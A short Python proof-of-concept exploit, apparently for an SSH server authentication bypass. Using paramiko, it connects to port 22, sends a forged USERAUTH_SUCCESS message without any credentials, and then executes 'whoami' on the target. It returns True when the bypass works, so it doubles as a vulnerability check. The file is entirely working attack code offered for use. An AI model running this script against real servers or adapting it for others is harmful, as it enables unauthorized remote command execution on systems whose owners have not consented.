# -*- coding:utf-8 -*-
import paramiko
import socket
import argparse
from sys import exit


def poc(url):
	
	port = 22
	command = 'whoami'
	#args = parser.parse_args()
	#paramiko.util.log_to_file(args.logfile)
	sock = socket.socket()
	
	try:
		sock.connect((str(url), int(port)))
		message = paramiko.message.Message()
		transport = paramiko.transport.Transport(sock)
		transport.start_client()
		message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
		transport._send_message(message)
		spawncmd = transport.open_session(timeout=5)
		spawncmd.exec_command(command)
		#out = spawncmd.makefile("rb", 2048)
		#output = out.read()
		#out.close()
		#print(output)
		return True
	except:
		return False
